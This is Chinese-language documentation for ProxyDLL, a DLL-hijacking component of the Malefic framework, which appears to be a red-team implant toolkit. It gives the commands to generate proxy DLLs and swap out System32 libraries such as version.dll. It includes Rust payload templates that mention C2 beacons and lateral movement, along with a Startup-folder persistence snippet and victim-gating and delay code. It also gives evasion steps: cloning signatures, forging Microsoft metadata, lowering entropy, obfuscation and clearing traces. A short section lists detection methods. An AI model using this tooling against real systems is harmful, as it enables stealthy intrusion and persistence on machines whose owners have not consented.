---
title: ProxyDLL
description: Malefic ProxyDLL 是一个 DLL 劫持框架，用于生成代理 DLL，实现合法 DLL 调用转发的同时执行自定义 payload。
edition: community
generated: false
source: imp:getting-started/components/proxydll.md
---

# ProxyDLL

Malefic ProxyDLL 是一个 DLL 劫持框架，用于生成代理 DLL，实现合法 DLL 调用转发的同时执行自定义 payload。

## 概述

ProxyDLL 通过 DLL 劫持技术，生成代理 DLL 来替换目标程序加载的合法 DLL。其核心特性：

- **透明转发** ：将合法函数调用转发到原始 DLL，保持应用程序正常运行
- **Payload 执行** ：在劫持的函数中执行自定义代码
- **静态映射** ：使用 `HIJACKED_FUNCTIONS` 数组进行静态函数名映射
- **多线程模型** ：支持多种 payload 执行线程模型
- **自动生成** ：通过 `malefic-mutant` 自动生成完整代码

## 架构

### 核心组件

```
malefic-proxydll/
├── src/
│   ├── lib.rs      # 生成的代理 DLL（包含所有逻辑）
│   └── payload.rs  # 用户 payload 实现
├── proxy.def       # 生成的 DLL 导出定义
├── Cargo.toml      # 项目配置
└── build.rs        # 构建脚本
```

### 生成的文件

#### lib.rs

完整的代理 DLL 实现，包含：

- 静态函数名映射（`HIJACKED_FUNCTIONS` 数组）
- Gateway 函数（处理 DLL 加载和转发）
- 导出函数（劫持和转发调用）
- 线程管理和 payload 执行

#### proxy.def

DLL 导出定义文件：

- **劫持函数** ：直接导出（不转发）
- **其他函数** ：转发到原始 DLL

## 使用流程

### 步骤 1：生成 ProxyDLL

使用 `malefic-mutant` 生成代理 DLL 代码：

```bash
# 基本生成
malefic-mutant generate loader proxydll \
  -r version.dll \
  -p version_orig.dll \
  -e GetFileVersionInfoW
```

**参数说明** ：

- `-r, --raw-dll`: 要劫持的 DLL 名称（如 `version.dll`）
- `-p, --proxied-dll`: 原始 DLL 重命名后的名称（如 `version_orig.dll`）
- `-e, --export`: 要劫持的导出函数名（如 `GetFileVersionInfoW`）

**高级选项** ：

```bash
# 劫持 DllMain
malefic-mutant generate loader proxydll \
  -r version.dll \
  -p version_orig.dll \
  --hijack-dll-main

# 从 implant.yaml 读取配置
malefic-mutant generate loader proxydll
```

### 步骤 2：实现 Payload

编辑 `malefic-proxydll/src/payload.rs` 实现自定义逻辑：

```rust
#[no_mangle]
pub extern "C" fn execute_payload() {
    // 你的 payload 代码：
    // - 建立 C2 连接
    // - 下载额外模块
    // - 权限维持
    // - 横向移动
    // 等等...
}
```

**示例 Payload** ：

```rust
use std::process::Command;

#[no_mangle]
pub extern "C" fn execute_payload() {
    // 执行命令
    let _ = Command::new("cmd.exe")
        .args(&["/c", "whoami > C:\\temp\\output.txt"])
        .spawn();

    // 或建立 beacon 连接
    // beacon::connect("192.168.1.100:443");
}
```

### 步骤 3：编译 ProxyDLL

```bash
# 标准编译
cargo build --release -p malefic-proxydll --target x86_64-pc-windows-gnu

# 或使用 mutant
malefic-mutant build proxy-dll --target x86_64-pc-windows-gnu
```

编译产物位于 `target/<target_triple>/release/malefic_proxydll.dll`。

### 步骤 4：部署和测试

1. **备份原始 DLL** ：
```bash
mv C:\Windows\System32\version.dll C:\Windows\System32\version_orig.dll
```

2. **部署代理 DLL** ：
```bash
cp target/release/malefic_proxydll.dll C:\Windows\System32\version.dll
```

3. **测试应用程序** ：
启动目标应用程序，验证：

- 应用程序正常运行（函数转发成功）
- Payload 被执行（检查日志或效果）

## 配置说明

### implant.yaml 配置

在 `implant.yaml` 中配置 ProxyDLL 参数：

```yaml
loader:
  proxydll:
    raw_dll: "version.dll"           # 要劫持的 DLL
    proxied_dll: "version_orig.dll"  # 原始 DLL 重命名
    proxyfunc: "GetFileVersionInfoW" # 劫持的函数
    proxy_dll: ""                    # 生成的代理 DLL 名称（可选）
    pack_resources: true             # 打包资源
    block: false                     # 是否阻塞执行
    hijack_dllmain: true             # 是否劫持 DllMain
```

### 配置字段说明

#### raw_dll

要劫持的目标 DLL 名称：

```yaml
raw_dll: "version.dll"
```

常见劫持目标：

- `version.dll` - 版本信息 API
- `winmm.dll` - 多媒体 API
- `dwmapi.dll` - 桌面窗口管理器 API
- `cryptsp.dll` - 加密服务提供者 API

#### proxied_dll

原始 DLL 重命名后的名称：

```yaml
proxied_dll: "version_orig.dll"
```

部署时需要将原始 DLL 重命名为此名称。

#### proxyfunc

要劫持的导出函数名：

```yaml
proxyfunc: "GetFileVersionInfoW"
```

选择标准：

- 应用程序启动时会调用
- 调用频率适中（不要太频繁）
- 不是关键路径函数

#### hijack_dllmain

是否劫持 DllMain 入口点：

```yaml
hijack_dllmain: true
```

- `true`: 在 DLL 加载时执行 payload（更早执行）
- `false`: 在指定函数调用时执行 payload（更隐蔽）

#### pack_resources

是否打包资源到 DLL：

```yaml
pack_resources: true
```

启用后可将额外文件嵌入 DLL。

#### block

Payload 执行是否阻塞：

```yaml
block: false
```

- `true`: 阻塞执行，等待 payload 完成
- `false`: 非阻塞执行，payload 在后台运行

## 线程模型

ProxyDLL 支持多种线程模型：

### 同步执行

在调用线程中直接执行 payload：

```rust
pub extern "C" fn execute_payload() {
    // 直接执行，会阻塞调用线程
    do_something();
}
```

**优点** ：简单，无需线程管理
**缺点** ：可能影响应用程序性能

### 异步执行

创建新线程执行 payload：

```rust
use std::thread;

pub extern "C" fn execute_payload() {
    thread::spawn(|| {
        // 在新线程中执行
        do_something();
    });
}
```

**优点** ：不阻塞主线程
**缺点** ：需要管理线程生命周期

### 一次性执行

使用全局标志确保只执行一次：

```rust
use std::sync::Once;

static INIT: Once = Once::new();

pub extern "C" fn execute_payload() {
    INIT.call_once(|| {
        // 只执行一次
        do_something();
    });
}
```

**优点** ：避免重复执行
**缺点** ：只能执行一次

## 常见劫持场景

### 场景 1：应用程序启动劫持

劫持应用程序启动时加载的 DLL：

```bash
# 1. 识别目标 DLL
# 使用 Process Monitor 或 Dependency Walker

# 2. 生成代理 DLL
malefic-mutant generate loader proxydll \
  -r dwmapi.dll \
  -p dwmapi_orig.dll \
  -e DwmIsCompositionEnabled

# 3. 部署
mv C:\Windows\System32\dwmapi.dll C:\Windows\System32\dwmapi_orig.dll
cp malefic_proxydll.dll C:\Windows\System32\dwmapi.dll
```

### 场景 2：特定功能劫持

劫持特定功能的 DLL：

```bash
# 劫持加密 API
malefic-mutant generate loader proxydll \
  -r cryptsp.dll \
  -p cryptsp_orig.dll \
  -e CryptAcquireContextW
```

### 场景 3：用户目录劫持

在用户目录下劫持（无需管理员权限）：

```bash
# 1. 复制目标程序到用户目录
cp "C:\Program Files\App\app.exe" C:\Users\User\app.exe

# 2. 生成并部署代理 DLL
malefic-mutant generate loader proxydll -r version.dll -p version_orig.dll -e GetFileVersionInfoW
cp C:\Windows\System32\version.dll C:\Users\User\version_orig.dll
cp malefic_proxydll.dll C:\Users\User\version.dll

# 3. 运行
C:\Users\User\app.exe
```

## 高级技巧

### 多函数劫持

劫持多个函数：

```rust
// 在 payload.rs 中
#[no_mangle]
pub extern "C" fn hijacked_function_1() {
    execute_payload();
    // 转发到原始函数
}

#[no_mangle]
pub extern "C" fn hijacked_function_2() {
    execute_payload();
    // 转发到原始函数
}
```

### 条件执行

根据条件决定是否执行 payload：

```rust
pub extern "C" fn execute_payload() {
    // 检查环境
    if is_target_environment() {
        do_something();
    }
}

fn is_target_environment() -> bool {
    // 检查用户名、主机名等
    std::env::var("USERNAME").unwrap_or_default() == "target_user"
}
```

### 延迟执行

延迟一段时间后执行：

```rust
use std::{thread, time::Duration};

pub extern "C" fn execute_payload() {
    thread::spawn(|| {
        // 延迟 30 秒
        thread::sleep(Duration::from_secs(30));
        do_something();
    });
}
```

### 持久化

将自身复制到其他位置：

```rust
use std::fs;

pub extern "C" fn execute_payload() {
    // 复制到启动目录
    let _ = fs::copy(
        "C:\\Windows\\System32\\version.dll",
        "C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\version.dll"
    );
}
```

## 检测与规避

### 检测方法

1. **DLL 签名验证** ：检查 DLL 是否有有效签名
2. **DLL 路径检查** ：验证 DLL 是否在预期位置
3. **导出函数验证** ：检查导出函数是否完整
4. **行为监控** ：监控 DLL 加载和函数调用

### 规避技术

1. **签名伪造** ：使用 `sigforge` 复制合法签名
```bash
malefic-mutant tool sigforge copy \
  -s C:\Windows\System32\version.dll \
  -t malefic_proxydll.dll \
  -o signed_proxy.dll
```

2. **元数据伪造** ：在 `implant.yaml` 中配置元数据
```yaml
build:
  metadata:
    company_name: "Microsoft Corporation"
    product_name: "Microsoft® Windows® Operating System"
    file_description: "Version Checking and File Installation Libraries"
    file_version: "10.0.19041.1"
    original_filename: "VERSION.DLL"
```

3. **熵值降低** ：降低 DLL 的熵值
```bash
malefic-mutant tool entropy -i malefic_proxydll.dll -o reduced.dll -t 6.0
```

4. **混淆处理** ：使用 OLLVM 混淆
```yaml
build:
  ollvm:
    enable: true
    bcfobf: true
    splitobf: true
```

## 故障排查

### 应用程序崩溃

**原因** ：

- 函数签名不匹配
- 原始 DLL 路径错误
- 缺少依赖

**解决** ：

- 验证导出函数签名
- 检查 `proxied_dll` 路径
- 使用 Dependency Walker 检查依赖

### Payload 未执行

**原因** ：

- 劫持的函数未被调用
- 线程创建失败
- 权限不足

**解决** ：

- 选择更早调用的函数
- 检查线程创建代码
- 使用管理员权限

### 函数转发失败

**原因** ：

- 原始 DLL 未找到
- 函数名拼写错误
- 架构不匹配（x86/x64）

**解决** ：

- 确认原始 DLL 存在
- 验证函数名
- 确保架构一致

## 最佳实践

### 选择合适的目标 DLL

优先选择：

- 应用程序启动时加载
- 导出函数较多（更多劫持选项）
- 不是系统关键 DLL

### 最小化 Payload

保持 payload 简单：

- 避免复杂逻辑
- 减少依赖
- 快速执行

### 测试兼容性

在测试环境充分测试：

- 不同 Windows 版本
- 不同应用程序版本
- 不同权限级别

### 清理痕迹

执行后清理：

- 删除临时文件
- 清除日志
- 恢复原始 DLL（可选）

## 编译选项

### 标准编译

```bash
cargo build --release -p malefic-proxydll --target x86_64-pc-windows-gnu
```

### 使用 Mutant

```bash
malefic-mutant build proxy-dll --target x86_64-pc-windows-gnu
```

### Docker 编译

```bash
docker run -v "$(pwd):/root/src" --rm -it \
  ghcr.io/chainreactors/malefic-builder:latest \
  sh -c "malefic-mutant generate loader proxydll -r version.dll -p version_orig.dll -e GetFileVersionInfoW && cargo build --release -p malefic-proxydll --target x86_64-pc-windows-gnu"
```

### 交叉编译

```bash
# x86 (32-bit)
cargo build --release -p malefic-proxydll --target i686-pc-windows-gnu

# x64 (64-bit)
cargo build --release -p malefic-proxydll --target x86_64-pc-windows-gnu
```

## 相关工具

### DLL 分析工具

- **Dependency Walker** : 查看 DLL 依赖和导出函数
- **Process Monitor** : 监控 DLL 加载
- **PE Explorer** : 查看 PE 文件结构
- **CFF Explorer** : 编辑 PE 文件

### 劫持检测工具

- **Sigcheck** : 验证 DLL 签名
- **Process Hacker** : 查看进程加载的 DLL
- **WinDbg** : 调试 DLL 加载过程

## 相关文档

- [ProxyDLL 构建](/malefic/build/proxydll/) - generate/build 与资源打包
- [Mutant 工具](/malefic/getting-started/components/mutant/) - generate/build 与 implant.yaml
- Starship 文档 (Pro) - Shellcode 加载框架
- [Win-Kit 文档](/malefic/getting-started/components/win-kit/) - Windows 功能库
